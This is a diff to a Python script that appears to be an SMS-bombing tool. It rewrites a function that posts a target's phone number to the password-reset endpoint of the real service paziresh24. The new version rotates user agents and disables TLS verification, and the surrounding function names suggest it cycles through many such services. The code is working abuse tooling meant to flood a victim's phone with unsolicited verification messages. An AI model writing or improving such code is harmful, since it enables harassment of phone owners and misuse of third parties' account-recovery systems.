@@ -65,32 +65,43 @@ def send_service_safe(service, phone):
 # ==========================
 
 def paziresh24(phone):
-    headers = {
-        "Accept": "application/json, text/plain, */*",
-        "accept-timezone": "Asia/Tehran",
-        "Content-Type": "application/json; charset=utf-8",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
-        "Referer": "https://www.paziresh24.com/"
-    }
-
-    urls = {
-        "register": "https://apigw.paziresh24.com/gozargah/register",
-        "reset": "https://apigw.paziresh24.com/gozargah/resetpassword"
-    }
-
-    data = {"username": phone}
-
-    for name, url in urls.items():
-        try:
-            r = requests.post(url, headers=headers, json=data, timeout=10)
-            if r.status_code == 200:
-                print(f"[+] paziresh24_{name} → Success for {phone}")
-            else:
-                print(f"[-] paziresh24_{name} → Failed ({r.status_code}) for {phone}")
-        except Exception as e:
-            print(f"[!] paziresh24_{name} → Error: {e}")
+    try:
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        formatted_phone = f"0{formatted_phone}"
         
-
+        headers = {
+            "Accept": "application/json, text/plain, */*",
+            "accept-timezone": "Asia/Tehran",
+            "content-type": "application/json; charset=utf-8",
+            "User-Agent": random.choice(user_agents),
+        }
+        
+        payload = {
+            "mobile": formatted_phone
+        }
+        
+        response = requests.post(
+            "https://apigw.paziresh24.com/gozargah/resetpassword",
+            json=payload,
+            headers=headers,
+            timeout=10,
+            verify=False
+        )
+        
+        print(f'{y}[Debug] paziresh24 Status: {response.status_code}{a}')
+        print(f'{y}[Debug] paziresh24 Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            print(f'{g}(paziresh24) reset password request sent!{a}')
+            return True
+        else:
+            print(f'{r}[-] paziresh24 error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] paziresh24 exception: {e}{a}')
+        return False
+        
 
 def tebinja(phone):
     try:
